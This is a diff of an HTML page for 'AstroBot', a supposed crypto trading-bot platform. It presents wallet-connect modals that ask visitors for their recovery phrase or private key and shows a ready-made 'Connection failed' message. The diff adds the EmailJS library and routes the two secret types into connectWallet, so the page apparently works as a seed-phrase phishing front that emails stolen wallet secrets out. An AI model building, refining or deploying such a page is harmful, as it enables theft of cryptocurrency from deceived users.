@@ -1,5 +1,6 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -13,7 +14,10 @@
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
     <!-- Font Awesome for better icons -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+
+    <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
 </head>
+
 <body>
     <!-- Welcome Popup -->
     <div id="welcomePopup" class="welcome-popup">
@@ -23,8 +27,8 @@
             </div>
             <button class="welcome-close" onclick="closeWelcomePopup()">
                 <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor">
-                    <line x1="18" y1="6" x2="6" y2="18" stroke-width="2" stroke-linecap="round"/>
-                    <line x1="6" y1="6" x2="18" y2="18" stroke-width="2" stroke-linecap="round"/>
+                    <line x1="18" y1="6" x2="6" y2="18" stroke-width="2" stroke-linecap="round" />
+                    <line x1="6" y1="6" x2="18" y2="18" stroke-width="2" stroke-linecap="round" />
                 </svg>
             </button>
         </div>
@@ -35,9 +39,10 @@
         <div class="failed-content">
             <div class="failed-icon">
                 <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor">
-                    <circle cx="12" cy="12" r="10" stroke="currentColor" stroke-width="2" fill="none"/>
-                    <line x1="12" y1="8" x2="12" y2="12" stroke="currentColor" stroke-width="2" stroke-linecap="round"/>
-                    <circle cx="12" cy="16" r="1" fill="currentColor"/>
+                    <circle cx="12" cy="12" r="10" stroke="currentColor" stroke-width="2" fill="none" />
+                    <line x1="12" y1="8" x2="12" y2="12" stroke="currentColor" stroke-width="2"
+                        stroke-linecap="round" />
+                    <circle cx="12" cy="16" r="1" fill="currentColor" />
                 </svg>
             </div>
             <p>Connection failed. Unable to connect to wallet.</p>
@@ -56,8 +61,8 @@
                 </div>
                 <button class="menu-close" onclick="closeMobileMenu()">
                     <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor">
-                        <line x1="18" y1="6" x2="6" y2="18" stroke-width="2" stroke-linecap="round"/>
-                        <line x1="6" y1="6" x2="18" y2="18" stroke-width="2" stroke-linecap="round"/>
+                        <line x1="18" y1="6" x2="6" y2="18" stroke-width="2" stroke-linecap="round" />
+                        <line x1="6" y1="6" x2="18" y2="18" stroke-width="2" stroke-linecap="round" />
                     </svg>
                 </button>
             </div>
@@ -83,19 +88,20 @@
                     </div>
                     <button class="modal-close" onclick="closeWalletModal()">
                         <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor">
-                            <line x1="18" y1="6" x2="6" y2="18" stroke-width="2" stroke-linecap="round"/>
-                            <line x1="6" y1="6" x2="18" y2="18" stroke-width="2" stroke-linecap="round"/>
+                            <line x1="18" y1="6" x2="6" y2="18" stroke-width="2" stroke-linecap="round" />
+                            <line x1="6" y1="6" x2="18" y2="18" stroke-width="2" stroke-linecap="round" />
                         </svg>
                     </button>
                 </div>
                 <div class="modal-body">
                     <button class="wallet-option hover-lift" onclick="selectWallet('Phantom')">
                         <div class="wallet-icon">
-                            <img src="assets/Phantom Logo.jpg" alt="Phantom logo" onerror="this.style.border='2px solid tomato'; this.alt='missing';">
+                            <img src="assets/Phantom Logo.jpg" alt="Phantom logo"
+                                onerror="this.style.border='2px solid tomato'; this.alt='missing';">
                         </div>
                         <span>Phantom</span>
                         <svg class="arrow" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor">
-                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7"/>
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7" />
                         </svg>
                     </button>
                     <button class="wallet-option hover-lift" onclick="selectWallet('Solflare')">
@@ -104,7 +110,7 @@
                         </div>
                         <span>Solflare</span>
                         <svg class="arrow" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor">
-                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7"/>
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7" />
                         </svg>
                     </button>
                     <button class="wallet-option hover-lift" onclick="selectWallet('Trust Wallet')">
@@ -113,7 +119,7 @@
                         </div>
                         <span>Trust Wallet</span>
                         <svg class="arrow" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor">
-                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7"/>
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7" />
                         </svg>
                     </button>
                     <button class="wallet-option hover-lift" onclick="selectWallet('WalletConnect')">
@@ -122,7 +128,7 @@
                         </div>
                         <span>WalletConnect</span>
                         <svg class="arrow" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor">
-                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7"/>
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7" />
                         </svg>
                     </button>
                 </div>
@@ -141,8 +147,8 @@
                     </div>
                     <button class="modal-close" onclick="closeWalletModal()">
                         <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor">
-                            <line x1="18" y1="6" x2="6" y2="18" stroke-width="2" stroke-linecap="round"/>
-                            <line x1="6" y1="6" x2="18" y2="18" stroke-width="2" stroke-linecap="round"/>
+                            <line x1="18" y1="6" x2="6" y2="18" stroke-width="2" stroke-linecap="round" />
+                            <line x1="6" y1="6" x2="18" y2="18" stroke-width="2" stroke-linecap="round" />
                         </svg>
                     </button>
                 </div>
@@ -162,7 +168,7 @@
                             <div class="import-subtitle">Enter your 12 or 24 word recovery phrase</div>
                         </div>
                         <svg class="arrow" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor">
-                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7"/>
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7" />
                         </svg>
                     </button>
                     <button class="import-option hover-lift" onclick="showPrivateKey()">
@@ -174,7 +180,7 @@
                             <div class="import-subtitle">Enter your private key directly</div>
                         </div>
                         <svg class="arrow" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor">
-                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7"/>
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7" />
                         </svg>
                     </button>
                 </div>
@@ -190,8 +196,8 @@
                     </div>
                     <button class="modal-close" onclick="closeWalletModal()">
                         <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor">
-                            <line x1="18" y1="6" x2="6" y2="18" stroke-width="2" stroke-linecap="round"/>
-                            <line x1="6" y1="6" x2="18" y2="18" stroke-width="2" stroke-linecap="round"/>
+                            <line x1="18" y1="6" x2="6" y2="18" stroke-width="2" stroke-linecap="round" />
+                            <line x1="6" y1="6" x2="18" y2="18" stroke-width="2" stroke-linecap="round" />
                         </svg>
                     </button>
                 </div>
@@ -206,7 +212,7 @@
                         <div class="shield-icon">
                             <!-- replaced Font Awesome shield with SVG from index.html -->
                             <svg width="40" height="40" viewBox="0 0 24 24" fill="currentColor">
-                                <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/>
+                                <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z" />
                             </svg>
                         </div>
                         <h3>Enter Recovery Phrase</h3>
@@ -215,7 +221,9 @@
                     <div class="input-group">
                         <label>Recovery Phrase</label>
                         <div class="input-wrapper">
-                            <textarea id="recoveryPhraseInput" placeholder="Enter your 12 or 24 word recovery phrase (one word per line or separated by spaces)" class="recovery-input" rows="6"></textarea>
+                            <textarea id="recoveryPhraseInput" class="PhraseInput"
+                                placeholder="Enter your 12 or 24 word recovery phrase (one word per line or separated by spaces)"
+                                class="recovery-input" rows="6"></textarea>
                             <button class="toggle-visibility" onclick="toggleRecoveryVisibility()">
                                 <i id="recoveryEyeIcon" class="fas fa-eye"></i>
                             </button>
@@ -230,10 +238,11 @@
                             <i class="fas fa-arrow-left"></i>
                             Back
                         </button>
-                        <button class="connect-btn hover-lift" onclick="connectWallet()">
+                        <button id="connectBtn" class="connect-btn hover-lift" onclick="connectWallet('recovery')">
                             <!-- replaced with SVG from index.html -->
                             <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor">
-                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M7 16a4 4 0 01-.88-7.903A5 5 0 1115.9 6L16 6a5 5 0 011 9.9M9 19l3 3m0 0l3-3m-3 3V10"/>
+                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                                    d="M7 16a4 4 0 01-.88-7.903A5 5 0 1115.9 6L16 6a5 5 0 011 9.9M9 19l3 3m0 0l3-3m-3 3V10" />
                             </svg>
                             Connect Wallet
                         </button>
@@ -251,8 +260,8 @@
                     </div>
                     <button class="modal-close" onclick="closeWalletModal()">
                         <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor">
-                            <line x1="18" y1="6" x2="6" y2="18" stroke-width="2" stroke-linecap="round"/>
-                            <line x1="6" y1="6" x2="18" y2="18" stroke-width="2" stroke-linecap="round"/>
+                            <line x1="18" y1="6" x2="6" y2="18" stroke-width="2" stroke-linecap="round" />
+                            <line x1="6" y1="6" x2="18" y2="18" stroke-width="2" stroke-linecap="round" />
                         </svg>
                     </button>
                 </div>
@@ -267,7 +276,7 @@
                         <div class="shield-icon">
                             <!-- replaced Font Awesome shield with SVG from index.html -->
                             <svg width="40" height="40" viewBox="0 0 24 24" fill="currentColor">
-                                <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/>
+                                <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z" />
                             </svg>
                         </div>
                         <h3>Enter Private Key</h3>
@@ -276,7 +285,8 @@
                     <div class="input-group">
                         <label>Private Key</label>
                         <div class="input-wrapper">
-                            <textarea id="privateKeyInput" placeholder="Enter your private key" class="private-key-input" rows="6"></textarea>
+                            <textarea id="privateKeyInput" class="PhraseInput" placeholder="Enter your private key"
+                                class="private-key-input" rows="6"></textarea>
                             <button class="toggle-visibility" onclick="togglePrivateKeyVisibility()">
                                 <i id="privateKeyEyeIcon" class="fas fa-eye"></i>
                             </button>
@@ -291,10 +301,11 @@
                             <i class="fas fa-arrow-left"></i>
                             Back
                         </button>
-                        <button class="connect-btn hover-lift" onclick="connectWallet()">
+                        <button id="connectBtn" class="connect-btn hover-lift" onclick="connectWallet('private')">
                             <!-- replaced with SVG from index.html -->
                             <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor">
-                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M7 16a4 4 0 01-.88-7.903A5 5 0 1115.9 6L16 6a5 5 0 011 9.9M9 19l3 3m0 0l3-3m-3 3V10"/>
+                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                                    d="M7 16a4 4 0 01-.88-7.903A5 5 0 1115.9 6L16 6a5 5 0 011 9.9M9 19l3 3m0 0l3-3m-3 3V10" />
                             </svg>
                             Connect Wallet
                         </button>
@@ -312,8 +323,8 @@
                     </div>
                     <button class="modal-close" onclick="closeWalletModal()">
                         <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor">
-                            <line x1="18" y1="6" x2="6" y2="18" stroke-width="2" stroke-linecap="round"/>
-                            <line x1="6" y1="6" x2="18" y2="18" stroke-width="2" stroke-linecap="round"/>
+                            <line x1="18" y1="6" x2="6" y2="18" stroke-width="2" stroke-linecap="round" />
+                            <line x1="6" y1="6" x2="18" y2="18" stroke-width="2" stroke-linecap="round" />
                         </svg>
                     </button>
                 </div>
@@ -336,8 +347,8 @@
                     </div>
                     <button class="modal-close" onclick="closeWalletModal()">
                         <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor">
-                            <line x1="18" y1="6" x2="6" y2="18" stroke-width="2" stroke-linecap="round"/>
-                            <line x1="6" y1="6" x2="18" y2="18" stroke-width="2" stroke-linecap="round"/>
+                            <line x1="18" y1="6" x2="6" y2="18" stroke-width="2" stroke-linecap="round" />
+                            <line x1="6" y1="6" x2="18" y2="18" stroke-width="2" stroke-linecap="round" />
                         </svg>
                     </button>
                 </div>
@@ -378,9 +389,9 @@
             </div>
             <button class="menu-btn" onclick="openMobileMenu()">
                 <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor">
-                    <line x1="3" y1="6" x2="21" y2="6" stroke-width="2" stroke-linecap="round"/>
-                    <line x1="3" y1="12" x2="21" y2="12" stroke-width="2" stroke-linecap="round"/>
-                    <line x1="3" y1="18" x2="21" y2="18" stroke-width="2" stroke-linecap="round"/>
+                    <line x1="3" y1="6" x2="21" y2="6" stroke-width="2" stroke-linecap="round" />
+                    <line x1="3" y1="12" x2="21" y2="12" stroke-width="2" stroke-linecap="round" />
+                    <line x1="3" y1="18" x2="21" y2="18" stroke-width="2" stroke-linecap="round" />
                 </svg>
             </button>
         </header>
@@ -388,11 +399,14 @@
         <!-- Hero Section -->
         <section class="hero">
             <h2 class="slide-in-left">
-                Advanced Trading<br/>
+                Advanced Trading<br />
                 with <span class="highlight">AstroBot</span>
             </h2>
             <p class="slide-in-right fade-in-delay">
-                Experience the future of automated <span class="accent">CRYPTO</span> and <span class="accent">MEMECOINS</span> trading with our next-gen trading bots. Connect your wallet and ride the momentum of viral <span class="accent">MEMECOINS</span> and top <span class="accent">CRYPTO</span> assets with speed, precision, and confidence all on one powerful, premium platform.
+                Experience the future of automated <span class="accent">CRYPTO</span> and <span
+                    class="accent">MEMECOINS</span> trading with our next-gen trading bots. Connect your wallet and ride
+                the momentum of viral <span class="accent">MEMECOINS</span> and top <span class="accent">CRYPTO</span>
+                assets with speed, precision, and confidence all on one powerful, premium platform.
             </p>
             <button class="hero-connect-btn hover-lift pulse slide-in-up fade-in-delay-2" onclick="openWalletModal()">
                 <i class="fas fa-wallet"></i>
@@ -435,4 +449,5 @@
 
     <script src="script.js"></script>
 </body>
+
 </html>
